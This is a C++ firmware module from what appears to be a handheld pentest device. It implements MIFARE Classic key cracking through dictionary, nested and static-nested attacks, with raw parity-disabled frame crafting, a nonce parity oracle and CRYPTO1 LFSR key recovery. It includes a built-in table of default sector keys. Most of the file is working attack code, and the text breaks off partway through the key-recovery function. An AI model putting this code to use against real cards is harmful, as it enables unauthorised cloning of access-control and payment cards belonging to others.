#include "nfc_mifare_crack.h"

#include "nfc_common.h"
#include "ws1850s_driver.h"

#include "../../hal/istorage.h"
#include "../../hal/storage_sd.h"
#include "../../hal/nfc_pn532.h" // nfc_release_external_i2c() -- GPIO53 arbiter
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"

#include "../../../boards/tab5/pins_config.h"

#include <feature_registry.h>
#include <lvgl.h>

#include <Arduino.h>
#include <Wire.h>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <freertos/task.h>

#include <cstdio>
#include <cstring>

// Vendored at lib/MFRC522_I2C/ (see that library's src/MFRC522_I2C.h for its
// upstream repo/commit and why it is in-tree). Used here for PICC-level
// anticollision AND for register-level access -- see COMPOSITION below.
#include <MFRC522_I2C.h>

// Vendored at lib/crapto1/ (GPLv2+, Copyright (C) 2008-2014 bla
// <blapost@gmail.com>). See that library's src/crapto1.h for the full
// provenance header, the canonical-upstream cross-check, the memory sizing,
// and the one function in it that must never be called.
extern "C" {
#include <crapto1.h>
}

// ===========================================================================
// SOURCES -- every attack, constant and register sequence below traces to one
// of these. Nothing here was re-derived, guessed, or approximated.
//
// [UG-N]  ~/src/unigeek-main/firmware/src/utils/nfc/NestedAttack.{h,cpp}
//         (342 lines). Nested attack for non-static-nonce cards.
// [UG-S]  ~/src/unigeek-main/firmware/src/utils/nfc/StaticNestedAttack.{h,cpp}
//         (420 lines). Static-nested variant + isStaticNonce() detection.
// [UG-D]  ~/src/unigeek-main/firmware/src/utils/nfc/DarksideAttack.{h,cpp}
//         (380 lines). Parity-oracle-filtered dictionary attack (see the
//         DARKSIDE section's honesty note) + the COMMON_KEYS[] table.
// [UG-UI] ~/src/unigeek-main/firmware/src/screens/module/MFRC522Screen.cpp
//         (1158 lines). NOT a protocol source -- it is UI -- but it is the
//         real orchestration this port follows for the dictionary attack's
//         per-sector/per-key-type/per-key loop (:668-796), the card-reset
//         sequence between failed authentications (_resetCardState(),
//         :337-348), the sector-count table (MFRC522Screen.h:44-48), the
//         sector -> trailer-block mapping (:748-750), the exploit-sector
//         selection for both nested attacks (:812-832), and the
//         "FF:FF:FF:FF:FF:FF" / "FFFFFFFFFFFF" dictionary-file text format
//         (_parseHexKey(), :648-666).
// [C1]    lib/crapto1/ -- CRYPTO1 cipher + LFSR recovery. GPLv2+, third
//         party; see its own provenance header. Cross-checked against
//         nfc-tools/mfcuk's canonical redistribution.
// [MFRC]  NXP MFRC522 datasheet register semantics, as already established
//         and hardware-confirmed by this project's own
//         features/nfc/ws1850s_driver.{h,cpp} (Phase 3 Tasks 2/3).
// [T9T]   test/test_crapto1/test_crapto1.cpp -- this task's host-native
//         tests. Cited below wherever a decision rests on their result
//         rather than on a donor line.
//
// COMPOSITION -- MFRC522_I2C vs. Ws1850sDriver, following nfc_read.cpp.
// All three donor attacks operate on an `MFRC522_I2C*`, so this module
// constructs its own instance (s_mfrc below) exactly as
// nfc_read.cpp's try_read_rfid2_uid() does, and -- exactly as that reviewed
// precedent does -- DELIBERATELY NEVER CALLS PCD_Init() ON IT. This project
// owns the chip's register programme through Ws1850sDriver::init() (Task 3,
// hardware-confirmed: VersionReg 0x15 on the real unit), and every attack
// here is only allowed to start after that has run. The donor's own
// post-attack `_module->PCD_Init()` calls ([UG-UI]:942, :1086, :1132) map
// onto a Ws1850sDriver::init() re-run in reap_worker() below, for the same
// reason the donor makes them: the attacks leave MfRxReg's parity bit and
// the antenna in whatever state they last set.
//
// Ws1850sDriver's own functions are MAIN-TASK-ONLY (they call
// nfc_ensure_external_i2c_begun(), which takes the GPIO53 arbiter, and
// hal/gpio53_arbiter.h documents claim/release as main-task-only). The
// worker task therefore touches ONLY MFRC522_I2C, which goes straight to
// Wire1. Every Ws1850sDriver call in this file is in poll() or a click
// handler.
// ===========================================================================

// ===========================================================================
// EXECUTION MODEL -- a worker task, not a per-tick loop. DISCLOSED DEVIATION.
//
// Task 9's brief says "poll()-driven with a progress UI ... same streaming
// pattern as Task 8". The progress UI here IS poll()-driven and streams
// exactly like Task 8's bruteforce screen. The ATTACK ITSELF is not, and
// cannot honestly be, chunked into ~50 ms poll() slices:
//
//   1. The smallest indivisible unit of the dictionary attack is one
//      PCD_Authenticate() plus, on failure, the donor's own card-reset
//      sequence -- PCD_StopCrypto1 / PICC_HaltA / delay(100) / PICC_WakeupA
//      / delay(100) / PICC_Select ([UG-UI]:337-348). That is >200 ms for a
//      SINGLE key try: already 4x the poll() budget before any batching.
//   2. lfsr_recovery32() ([C1]) is one uninterruptible call that allocates
//      ~18 MB and runs a 2^20 sieve plus recursive table extension. It is
//      seconds, not milliseconds, and chunking it means rewriting the
//      algorithm -- the exact opposite of the spec's own instruction to
//      "port ... closely rather than re-deriving".
//   3. The nested attacks' nonce collection is a strictly ordered, timing-
//      sensitive raw-frame exchange with the card (auth -> nested auth,
//      [UG-N]:140-226). Suspending it mid-exchange across poll() ticks would
//      break the very timing the spec flags as this task's main risk.
//
// So: poll() (main task) owns bring-up, card selection, launching the worker,
// reaping it, restoring the chip, and every LVGL write. The worker runs the
// ported attacks straight through and publishes progress under a mutex.
//
// WHY THE WORKER IS PINNED TO THE SAME CORE AS loopTask -- the opposite of
// features/rf433/rf433_replay.cpp's choice, deliberately.
// rf433_replay.cpp pins its transmit task to the core loopTask is NOT on,
// because microsecond pulse timing must not be preempted by an LVGL tick.
// This worker has the reverse constraint. The other core is core 0, and on
// this target CONFIG_ESP_TASK_WDT_CHECK_IDLE_TASK_CPU0=y with
// CONFIG_ESP_TASK_WDT_PANIC=y and CONFIG_ESP_TASK_WDT_TIMEOUT_S=5 (verified
// in framework-arduinoespressif32-libs/esp32p4/sdkconfig), while
// ...CHECK_IDLE_TASK_CPU1 is NOT set. A compute-bound task on core 0 starves
// IDLE0 and panics the board in 5 s -- and lfsr_recovery32() is exactly such
// a task, with no yield point to insert one into. Core 1's idle task is not
// watchdog-checked, so the worker lives there, at the SAME priority as
// loopTask (1, cores/esp32/main.cpp:113) so FreeRTOS time-slicing
// (configUSE_TIME_SLICING == 1, FreeRTOSConfig.h:94) keeps LVGL running
// alongside it. The UI is expected to feel roughly half-speed during a
// recovery; that is the accepted cost and it is visible to the user, unlike
// a watchdog panic.
// ===========================================================================

extern FeatureRegistry g_registry;
extern StorageSD storage; // defined in main.cpp (Phase 1 Task 10); same extern
                          // nfc_tag_library_ui.cpp / wifi_evil_portal.cpp use.

namespace NfcMifareCrack {
namespace {

// ── The reader instance ─────────────────────────────────────────────────────
// Construction is trivial (stores address/reset pin/TwoWire pointer only,
// MFRC522_I2C.cpp:21-28), so a file-scope instance touches no hardware.
MFRC522_I2C s_mfrc(TAB5_RFID2_I2C_ADDR, -1, &Wire1);

// ── Sizing constants, all cited ─────────────────────────────────────────────

// Sector counts per PICC type. [UG-UI] MFRC522Screen.h:44-48 -- {sectors,
// blocks}; only the sector count is needed here.
constexpr size_t kSectorsMini = 5;
constexpr size_t kSectors1K   = 16;
constexpr size_t kSectors4K   = 40;
constexpr size_t kMaxSectors  = kSectors4K;

// Nonces collected before attempting recovery. [UG-N]:241 / [UG-S]:342
// (`COLLECT_NR = 3` in both).
constexpr int kCollectNonces = 3;

// Ceiling on on-card verifications when the collected data provides no
// software filter at all. NOT a donor constant -- see the "UNFILTERED
// CANDIDATE WALK" note in recover_from_ks() for why this case exists and why
// it is bounded rather than left to run for hours.
constexpr int kMaxUnfilteredVerifications = 256;

// Ceiling on how far to walk lfsr_recovery32()'s candidate-state list.
//
// The donor uses 100000 ([UG-N]:334, [UG-S]:414). That number is too small
// and was raised, with evidence rather than by feel: over 24 randomly chosen
// (key, uid, nt) triples run through the vendored library host-natively
// during this task, the returned candidate list ranged 40,947 - 154,717
// entries (mean 74,557), and the true key sat as deep as index 74,565. A
// 100000 cap truncated 2 of those 24 lists outright. The value used instead
// is the list's own structural bound: lfsr_recovery32() allocates
// `sizeof(struct Crypto1State) << 18` (crapto1.c:130), so a well-formed,
// properly terminated list can never exceed 2^18 entries. This therefore
// cannot truncate a legitimate result, while still bounding a corrupt or
// unterminated one.
constexpr int kMaxCandidatesChecked = 1 << 18; // 262144

// Free PSRAM required before invoking lfsr_recovery32(). Its own allocations
// are (sizeof(uint32_t) << 21) * 2 + (sizeof(Crypto1State) << 18)
// = 8 MB + 8 MB + 2 MB (crapto1.c:128-130), all of which land in PSRAM on
// this target (CONFIG_SPIRAM_USE_MALLOC=y,
// CONFIG_SPIRAM_MALLOC_ALWAYSINTERNAL=4096 -- anything over 4 KB goes
// external). Checked up front so a run fails with a readable message instead
// of a null return three minutes into a sweep.
constexpr size_t kRecoveryPsramBytes = (8u << 20) + (8u << 20) + (2u << 20);
constexpr size_t kRecoveryPsramMargin = 2u << 20; // headroom for LVGL et al.

// Worker stack. Sized from measurement, not from a round number: crapto1's
// quicksort() is recursive, and instrumenting it host-natively over the same
// 5+24 recovery runs above showed a maximum recursion depth of 52 frames
// using ~3.6 KB of stack (x86-64, -O2); recover() adds at most a further
// ~4 nested frames. 16 KB leaves roughly 4x headroom for RISC-V's larger
// frames plus this module's own call depth. The worker logs its real
// high-water mark on exit (see worker_task()) so hardware bring-up gets a
// measured number rather than this estimate.
constexpr uint32_t kWorkerStackBytes = 16384;

// See the EXECUTION MODEL block for both of these.
constexpr UBaseType_t kWorkerPriority = 1;                  // == loopTask's
constexpr BaseType_t  kWorkerCore     = ARDUINO_RUNNING_CORE; // == loopTask's

// SD dictionary location. Follows this project's existing split between
// user-supplied inputs (`/quarky/portals`, wifi_evil_portal.cpp:42) and
// generated captures (`/quarky/captures/...`).
constexpr char kDictDir[] = "/quarky/dict/nfc";
constexpr int  kMaxDictFiles = 8;
constexpr size_t kDictFileMaxBytes = 8192; // ~600 keys/file at 13 bytes/line

// ── Ported low-level helpers ────────────────────────────────────────────────
// Byte-for-byte the same in all three donor attack files ([UG-N]:11-107,
// [UG-S]:11-135, [UG-D]:11-120); ported once here rather than three times.

// [UG-N]:11-14
uint8_t oddparity(uint8_t bt) {
    return (0x9669 >> ((bt ^ (bt >> 4)) & 0xF)) & 1;
}

// [UG-N]:16-21
uint64_t bytes_to_int(const uint8_t *buf, uint8_t len) {
    uint64_t nr = 0;
    for (int i = 0; i < len; i++) nr = (nr << 8) | buf[i];
    return nr;
}

// ISO/IEC 14443-3 CRC_A. [UG-N]:23-34 (identical in [UG-S]:32-43, [UG-D]:17-28).
void calc_crc(const uint8_t *data, uint8_t len, uint8_t *crc) {
    uint32_t wCrc = 0x6363;
    for (uint8_t i = 0; i < len; i++) {
        uint8_t bt = data[i];
        bt = (bt ^ (uint8_t)(wCrc & 0xFF));
        bt = (bt ^ (bt << 4));
        wCrc = (wCrc >> 8) ^ ((uint32_t)bt << 8) ^ ((uint32_t)bt << 3) ^ ((uint32_t)bt >> 4);
    }
    crc[0] = (uint8_t)(wCrc & 0xFF);
    crc[1] = (uint8_t)((wCrc >> 8) & 0xFF);
}

// Packs data[] + per-byte parity bits into the bit-shifted frame the MFRC522
// expects when hardware parity is disabled, returning the trailing valid-bit
// count for BitFramingReg. [UG-N]:36-47.
uint8_t make_raw_frame(uint8_t *data, uint8_t dataLen, uint8_t *parBits, uint8_t *pkt) {
    pkt[0] = data[0];
    pkt[1] = (parBits[0] | (data[1] << 1));
    int i;
    for (i = 2; i < dataLen; i++) {
        pkt[i]  = (parBits[i - 1] << (i - 1)) | (data[i - 1] >> (9 - i));
        pkt[i] |= (data[i] << i);
    }
    pkt[dataLen] = (parBits[dataLen - 1] << (i - 1)) | (data[dataLen - 1] >> (9 - i));
    return dataLen % 8;
}

// Inverse of make_raw_frame(). [UG-N]:49-58.
void extract_data(uint8_t *pkt, uint8_t len, uint8_t *parBits, uint8_t *data) {
    data[0] = pkt[0];
    int i;
    for (i = 1; i < len - 1; i++) {
        parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
        data[i] = (pkt[i] >> i) | (pkt[i + 1] << (8 - i));
    }
    parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
}

// MfRxReg (0x1D) bit 4 = ParityDisable [MFRC]. [UG-N]:60-61.
void parity_off() { s_mfrc.PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x10); }
void parity_on()  { s_mfrc.PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x00); }

// [UG-N]:63-67. NOTE the donor's two variants differ: NestedAttack's also
// calls PCD_StopCrypto1() first and uses 50 ms settles, DarksideAttack's/
// StaticNestedAttack's use 10 ms and no StopCrypto1 ([UG-D]:68-74,
// [UG-S]:83-89). The NestedAttack form is used here for all callers -- it is
// the strictly safer of the two (dropping stale CRYPTO1 state before
// dropping the field can only help), and its longer settle is on the side of
// the spec's own flagged risk that WS1850S response latency may differ from
// whatever MFRC522-class part the donor tested against.
void reset_picc() {
    s_mfrc.PCD_StopCrypto1();
    s_mfrc.PCD_AntennaOff();
    delay(50);
    s_mfrc.PCD_AntennaOn();
    delay(50);
}

// [UG-N]:69-79.
bool init_com() {
    for (int attempt = 0; attempt < 20; attempt++) {
        delay(10);
        uint8_t buf[2];
        uint8_t bufSize = sizeof(buf);
        if (s_mfrc.PICC_RequestA(buf, &bufSize) != MFRC522_I2C::STATUS_OK) continue;
        if (s_mfrc.PICC_Select(&s_mfrc.uid) != MFRC522_I2C::STATUS_OK) continue;
        return true;
    }
    return false;
}

// Raw command/response against the PICC, bypassing the library's own
// PCD_TransceiveData() so parity and bit framing stay under our control.
// [UG-N]:81-107. Register semantics per [MFRC]: ComIrqReg 0x7F clears all
// IRQ bits, FIFOLevelReg 0x80 flushes the FIFO, BitFramingReg bit 7 =
// StartSend, finish flag 0x30 = RxIRq|IdleIRq (0x10 = IdleIRq alone for
// non-receiving commands), ErrorReg 0x11 = BufferOvfl|ProtocolErr.
bool picc_io(uint8_t cmd, uint8_t sendLen, uint8_t *data, uint8_t bufLen,
             uint8_t validBits = 0) {
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::CommandReg, MFRC522_I2C::PCD_Idle);
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::ComIrqReg, 0x7F);
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::FIFOLevelReg, 0x80);
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::FIFODataReg, sendLen, data);
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::BitFramingReg, validBits);
    s_mfrc.PCD_WriteRegister(MFRC522_I2C::CommandReg, cmd);

    if (cmd == MFRC522_I2C::PCD_Transceive) {
        s_mfrc.PCD_SetRegisterBitMask(MFRC522_I2C::BitFramingReg, 0x80);
    }

    const uint8_t finishFlag = (cmd == MFRC522_I2C::PCD_Transceive ||
                                cmd == MFRC522_I2C::PCD_Receive) ? 0x30 : 0x10;

    for (int wd = 3000; wd > 0; --wd) {
        uint8_t irq = s_mfrc.PCD_ReadRegister(MFRC522_I2C::ComIrqReg);
        if (irq & finishFlag) break;
        if (irq & 0x01 || wd == 1) return false; // TimerIRq, or watchdog expired
    }

    uint8_t err = s_mfrc.PCD_ReadRegister(MFRC522_I2C::ErrorReg);
    if (err & 0x11) return false;

    if (cmd == MFRC522_I2C::PCD_Transceive || cmd == MFRC522_I2C::PCD_Receive) {
        uint8_t n = s_mfrc.PCD_ReadRegister(MFRC522_I2C::FIFOLevelReg);
        if (n > bufLen) return false;
        s_mfrc.PCD_ReadRegister(MFRC522_I2C::FIFODataReg, n, data);
    }
    return true;
}

// Parity oracle over a candidate nested nonce. [UG-N]:125-130 / [UG-S]:24-29.
uint8_t is_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, const uint8_t *par) {
    return ((oddparity((Nt >> 24) & 0xFF) == ((par[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
            (oddparity((Nt >> 16) & 0xFF) == ((par[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,  8))) &
            (oddparity((Nt >>  8) & 0xFF) == ((par[2]) ^ oddparity((NtEnc >>  8) & 0xFF) ^ BIT(Ks1,  0)))) ? 1 : 0;
}

void key_to_bytes(uint64_t key, uint8_t out[6]) {
    for (int i = 5; i >= 0; i--) {
        out[i] = (uint8_t)(key & 0xFF);
        key >>= 8;
    }
}

// Authenticate on the real card with a candidate key. [UG-N]:109-123.
bool verify_key_on_card(uint8_t authCmd, uint8_t blockAddr, uint64_t candidateKey) {
    MFRC522_I2C::MIFARE_Key mfKey;
    key_to_bytes(candidateKey, mfKey.keyByte);

    parity_on();
    reset_picc();
    if (!init_com()) return false;

    uint8_t status = s_mfrc.PCD_Authenticate(authCmd, blockAddr, &mfKey, &s_mfrc.uid);
    s_mfrc.PCD_StopCrypto1();
    return (status == MFRC522_I2C::STATUS_OK);
}

// Sector -> sector-trailer block. [UG-UI]:748-750 / :843-845. MIFARE Classic
// 4K's first 32 sectors are 4 blocks, the last 8 are 16 blocks.
int trailer_block(size_t sector) {
    return (sector < 32) ? ((int)sector * 4 + 3)
                         : (128 + ((int)sector - 32) * 16 + 15);
}

// Card-state reset between failed authentications. [UG-UI]:337-348.
bool reset_card_state() {
    uint8_t bufSize = 2;
    uint8_t buf[2];
    s_mfrc.PCD_StopCrypto1();
    s_mfrc.PICC_HaltA();
    delay(100);
    s_mfrc.PICC_WakeupA(buf, &bufSize);
    delay(100);
    return s_mfrc.PICC_Select(&s_mfrc.uid, 0) != MFRC522_I2C::STATUS_TIMEOUT;
}

// ── Built-in key list ───────────────────────────────────────────────────────
// Ported from [UG-D]:252-270, with two literals corrected -- disclosed, not
// silently "cleaned up":
//
//   * `0xAAAAAAAAAAULL` in the donor is TEN hex digits (5 bytes), sitting in
//     a run of twelve-digit all-same-byte keys (BB.., CC.., DD.., EE..). It
//     is written here as 0xAAAAAAAAAAAAULL, the value that run plainly
//     intends. As typed by the donor it is simply a different, meaningless
//     40-bit number that no MIFARE sector could ever hold.
//   * `0x6677889900AABBULL` is FOURTEEN hex digits (7 bytes) -- wider than a
//     48-bit MIFARE key, so it would be silently truncated to 0x778899.. by
//     any use. It sits immediately after 0x001122334455, and 001122334455 /
//     66778899aabb are a well-known adjacent PAIR in the standard MIFARE
//     default-key lists, so it is written here as 0x66778899AABBULL.
//
// Both corrections are typo repairs with an evident intended value, not new
// keys invented for this port. Neither changes what the attack can find in
// any meaningful sense (a malformed literal simply never matches anything);
// they are fixed so the list means what it says it means.
constexpr uint64_t kCommonKeys[] = {
    0xFFFFFFFFFFFFULL, 0xA0A1A2A3A4A5ULL, 0xB0B1B2B3B4B5ULL,
    0x000000000000ULL, 0xAABBCCDDEEFFULL, 0x4D3A99C351DDULL,
    0x1A982C7E459AULL, 0xD3F7D3F7D3F7ULL, 0x714C5C880592ULL,
    0xA0B0C0D0E0F0ULL, 0xA1B1C1D1E1F1ULL, 0xABCDEF123456ULL,
    0x010101010101ULL, 0x020202020202ULL, 0x030303030303ULL,
    0x040404040404ULL, 0x050505050505ULL, 0x060606060606ULL,
    0xFC00018C997BULL, 0x0A0B0C0D0E0FULL, 0x010203040506ULL,
    0x102030405060ULL, 0x112233445566ULL, 0xAAAAAAAAAAAAULL,
    0xBBBBBBBBBBBBULL, 0xCCCCCCCCCCCCULL, 0xDDDDDDDDDDDDULL,
    0xEEEEEEEEEEEEULL, 0x001122334455ULL, 0x66778899AABBULL,
    0x48454C504D45ULL, 0x4A4F484E4E59ULL,
    0xA0478CC39018ULL, 0x587160189541ULL, 0x533CB6C723F6ULL,
    0x8FD0A4F256E9ULL,
    // Patterns: all-same-byte ([UG-D]:266-269)
    0x111111111111ULL, 0x222222222222ULL, 0x333333333333ULL,
    0x444444444444ULL, 0x555555555555ULL, 0x666666666666ULL,
    0x777777777777ULL, 0x888888888888ULL, 0x999999999999ULL,
};
constexpr size_t kCommonKeyCount = sizeof(kCommonKeys) / sizeof(kCommonKeys[0]);

// Working key list = built-ins + whatever the SD dictionaries add.
constexpr size_t kMaxWorkingKeys = 256;
uint64_t s_keys[kMaxWorkingKeys];
size_t   s_key_count = 0;

// "FF:FF:FF:FF:FF:FF" or "FFFFFFFFFFFF", '#' comments, blank lines skipped.
// Same accepted format as [UG-D]:273-293 / [UG-UI]:648-666, rewritten against
// a plain char range because this project's IStorage hands back a byte
// buffer, not an Arduino String (see the IStorage section below).
bool parse_hex_key(const char *begin, const char *end, uint64_t *out_key) {
    while (begin < end && (*begin == ' ' || *begin == '\t' || *begin == '\r')) begin++;
    while (end > begin && (end[-1] == ' ' || end[-1] == '\t' || end[-1] == '\r')) end--;
    if (begin >= end || *begin == '#') return false;

    uint64_t key = 0;
    int nibbles = 0;
    for (const char *p = begin; p < end; p++) {
        const char c = *p;
        if (c == ':') continue; // the donor strips colons anywhere, not only
                                // at byte boundaries ([UG-D]:277)
        uint8_t nib;
        if (c >= '0' && c <= '9') nib = (uint8_t)(c - '0');
        else if (c >= 'A' && c <= 'F') nib = (uint8_t)(10 + c - 'A');
        else if (c >= 'a' && c <= 'f') nib = (uint8_t)(10 + c - 'a');
        else return false;
        if (++nibbles > 12) return false;
        key = (key << 4) | nib;
    }
    if (nibbles != 12) return false; // exactly 6 bytes, as the donor requires
    *out_key = key;
    return true;
}

void add_key(uint64_t key) {
    if (s_key_count >= kMaxWorkingKeys) return;
    for (size_t i = 0; i < s_key_count; i++) {
        if (s_keys[i] == key) return; // de-duplicate, [UG-D]:360-365
    }
    s_keys[s_key_count++] = key;
}

// ── IStorage adaptation ─────────────────────────────────────────────────────
//
// [UG-D]'s crack() takes an `IStorage*` and calls storage->isAvailable(),
// storage->listDir(path, DirEntry[], max) and storage->readFile(path) ->
// Arduino String ([UG-D]:332-355). That is UniGeek's OWN interface
// (core/IStorage.h in its checkout) and shares nothing but a name with this
// project's src/hal/istorage.h, which offers:
//     int  list_files(const char *dir, const char *ext_filter,
//                     char names_out[][64], int max_names);
//     bool read_file(const char *path, uint8_t *out, size_t max_len,
//                    size_t *out_len);
// So the call sites are re-expressed against the real interface rather than
// copied: list_files() already applies the ".txt" filter the donor did by
// hand and already returns basenames only (so the directory is re-prefixed
// here), and read_file() fills a caller-owned buffer, so the donor's
// String::indexOf('\n') / substring() line walk becomes a pointer scan over
// that buffer. Called on the MAIN task (from the Start handler), not the
// worker: SD_MMC access is not part of the attack's timing-sensitive path
// and there is no reason to take it off the main task.
void load_keys(IStorage &store) {
    s_key_count = 0;
    for (size_t i = 0; i < kCommonKeyCount; i++) add_key(kCommonKeys[i]);

    char names[kMaxDictFiles][64];
    const int n = store.list_files(kDictDir, ".txt", names, kMaxDictFiles);
    if (n <= 0) return;

    static uint8_t buf[kDictFileMaxBytes]; // static: too big for the LVGL
                                           // event-callback stack this runs on
    for (int f = 0; f < n && s_key_count < kMaxWorkingKeys; f++) {
        char path[128];
        std::snprintf(path, sizeof(path), "%s/%s", kDictDir, names[f]);
        size_t len = 0;
        if (!store.read_file(path, buf, sizeof(buf), &len) || len == 0) continue;

        const char *p = (const char *)buf;
        const char *file_end = p + len;
        while (p < file_end && s_key_count < kMaxWorkingKeys) {
            const char *nl = (const char *)std::memchr(p, '\n', (size_t)(file_end - p));
            const char *line_end = (nl != nullptr) ? nl : file_end;
            uint64_t key = 0;
            if (parse_hex_key(p, line_end, &key)) add_key(key);
            if (nl == nullptr) break;
            p = nl + 1;
        }
        Serial.printf("quarky-tab5: [mifare-crack] dictionary %s -> %u keys total\n",
                      path, (unsigned)s_key_count);
    }
}

// ── Recovered-key store ─────────────────────────────────────────────────────

struct KeySlot {
    bool    known = false;
    uint64_t key  = 0;
};
struct SectorKeys {
    KeySlot a;
    KeySlot b;
};
SectorKeys s_found[kMaxSectors];
size_t     s_sector_count = kSectors1K;
// UID s_found's contents were actually recovered from. Nested/static-nested
// deliberately let s_found survive across runs (see toggle_click_cb's own
// comment) so they have a key to exploit -- but that means if the user swaps
// in a DIFFERENT physical card between a Dictionary run and a Nested run,
// pick_exploit_sector() would otherwise hand the new card a key that belongs
// to the old one. Not a correctness/security bug (the on-card authenticate
// simply fails against the wrong key and the run reports no key found), but
// review flagged it as a real, avoidable UX gap: nothing distinguished "wrong
// key for this card" from "attack didn't work". prepare_card() checks this
// against the freshly-read s_uid32 and discards stale keys on a mismatch.
uint32_t s_found_uid32 = 0;

// ── Run state shared between the worker and poll() ──────────────────────────

enum class Mode : uint8_t { kDictionary = 0, kNested, kStaticNested, kDarkside };

struct Progress {
    char     msg[72];
    int      pct;
    uint32_t tried;     // key tries / distance steps completed this run
    uint32_t total;     // denominator for `tried`, 0 when not meaningful
    int      recovered; // key slots filled this run
};

SemaphoreHandle_t s_lock = nullptr; // guards s_progress and s_found
Progress s_progress{};

volatile bool s_worker_running = false;
volatile bool s_worker_done    = false;
volatile bool s_stop_requested = false;
volatile bool s_run_failed     = false;
char          s_fail_reason[64] = {0}; // written by the worker before
                                       // s_worker_done; read after -- the
                                       // flag publishes it
Mode     s_mode = Mode::kDictionary;
uint32_t s_uid32 = 0;
uint32_t s_started_ms = 0;

void lock()   { if (s_lock != nullptr) xSemaphoreTake(s_lock, portMAX_DELAY); }
void unlock() { if (s_lock != nullptr) xSemaphoreGive(s_lock); }

// The worker's progress channel. Replaces the donor's ProgressFn function
// pointer ([UG-N]:13, called as `progress(msg, pct)` and cancelling on a
// false return) with a direct call -- same contract, same cancellation
// semantics, one less layer of plumbing. Returns false when the user has
// tapped Stop, which every ported loop below honours exactly where the donor
// honoured its callback's false return.
bool report(const char *msg, int pct) {
    lock();
    std::snprintf(s_progress.msg, sizeof(s_progress.msg), "%s", msg);
    s_progress.pct = pct;
    unlock();
    return !s_stop_requested;
}

void report_counts(uint32_t tried, uint32_t total) {
    lock();
    s_progress.tried = tried;
    s_progress.total = total;
    unlock();
}

void record_key(size_t sector, bool is_key_a, uint64_t key) {
    lock();
    KeySlot &slot = is_key_a ? s_found[sector].a : s_found[sector].b;
    if (!slot.known) {
        slot.known = true;
        slot.key = key;
        s_progress.recovered++;
    }
    unlock();

    uint8_t kb[6];
    key_to_bytes(key, kb);
    Serial.printf("quarky-tab5: [mifare-crack] S%u key %c = %02X%02X%02X%02X%02X%02X\n",
                  (unsigned)sector, is_key_a ? 'A' : 'B',
                  kb[0], kb[1], kb[2], kb[3], kb[4], kb[5]);
}

void fail(const char *reason) {
    std::snprintf(s_fail_reason, sizeof(s_fail_reason), "%s", reason);
    s_run_failed = true;
    report(reason, 100);
}

// ── Shared recovery tail (nested + static nested) ───────────────────────────
//
// [UG-N]:300-337 and [UG-S]:374-417 run the identical sequence once they have
// a keystream word: lfsr_recovery32() -> walk the candidate list -> roll each
// candidate back -> software cross-check against the other collected nonces
// -> verify the survivor on the card. Factored out once here.
//
// `ks[i]` is the keystream word observed for nonce i, `in[i]` the
// corresponding (uid ^ nt) word fed into the cipher.
//
// !!! DONOR BUG, FIXED HERE, PROVEN BY [T9T] !!!
// Both donor cross-checks read:
//     Crypto1State* test = crypto1_create(candidateKey);
//     crypto1_word(test, uid ^ nt, 0);            // return DISCARDED
//     uint32_t testKs = crypto1_word(test, 0, 0); // <-- SECOND word
//     if ((encNt ^ nt) != testKs) softMatch = false;
// ([UG-N]:313-320, [UG-S]:392-399) -- they compare the observed keystream
// against the SECOND 32-bit word the cipher emits, while feeding the FIRST
// word to lfsr_recovery32() as `ks` a few lines earlier. Both cannot be
// right. test/test_crapto1/test_crapto1.cpp settles it directly against the
// vendored library: lfsr_recovery32() recovers the key from the FIRST word
// and does not from the second. So the donor's cross-check compares against
// the wrong word and REJECTS THE CORRECT KEY whenever more than one nonce
// was collected -- which is exactly what both attacks try to do
// (kCollectNonces == 3). The version below uses the first word's return.
//
// UNFILTERED CANDIDATE WALK (kMaxUnfilteredVerifications) -- a real
// limitation of the ported algorithm, bounded here rather than hidden.
//
// The cross-check above only discriminates when at least two of the supplied
// (ks, in) pairs are DIFFERENT. Whether they are depends on the attack:
//
//   * Nested (non-static nonce): each collected sample has its own nt1, so
//     at a given PRNG distance d each yields a different nt2 -- different ks
//     AND different in. Real filter; survivors collapse to essentially one.
//   * Static nested: by definition the tag returns the SAME nonce every
//     time, so every collected sample yields byte-identical ks and in. The
//     cross-check is then vacuous -- every candidate recovered from ks[0]
//     reproduces ks[0] by construction -- and the donor's own version is
//     equally vacuous, it just doesn't notice. Narrowing further genuinely
//     requires keystream this exchange does not produce (a second, distinct
//     nonce, or the encrypted reader/tag response words); that is a
//     different attack, not a tuning knob, and inventing one here would be
//     exactly the fabrication this project forbids.
//
// Measured host-natively during this task, lfsr_recovery32() returns
// 40,947-154,717 candidates (mean ~74,557, true key seen as deep as index
// 74,565). Each on-card verification is a full reset_picc() + init_com() +
// authenticate round trip, ~150 ms -- so an unfiltered walk is on the order
// of three hours PER SECTOR of hammering the card. The donor walks it
// anyway. This port instead detects the degenerate case (distinct_pairs < 2)
// and caps the walk, reporting honestly that it gave up rather than
// appearing to work. A capped walk is a long shot by construction
// (256 of ~75,000); the UI says so.
bool recover_from_ks(const uint32_t *ks, const uint32_t *in, int count,
                     uint8_t targetCmd, uint8_t targetBlock, uint64_t *out_key) {
    if (count < 1) return false;

    // How many of the supplied pairs actually differ from the first?
    int distinct_pairs = 1;
    for (int i = 1; i < count; i++) {
        if (ks[i] != ks[0] || in[i] != in[0]) distinct_pairs++;
    }
    const bool filtered = (distinct_pairs >= 2);
    const int verify_budget = filtered ? kMaxCandidatesChecked
                                       : kMaxUnfilteredVerifications;

    if (ESP.getFreePsram() < kRecoveryPsramBytes + kRecoveryPsramMargin) {
        fail("Not enough free PSRAM for key recovery");
        return false;
    }

    struct Crypto1State *revstate = lfsr_recovery32(ks[0], in[0]);
    if (revstate == nullptr) {
        fail("lfsr_recovery32() allocation failed");
        return false;
    }

    bool found = false;
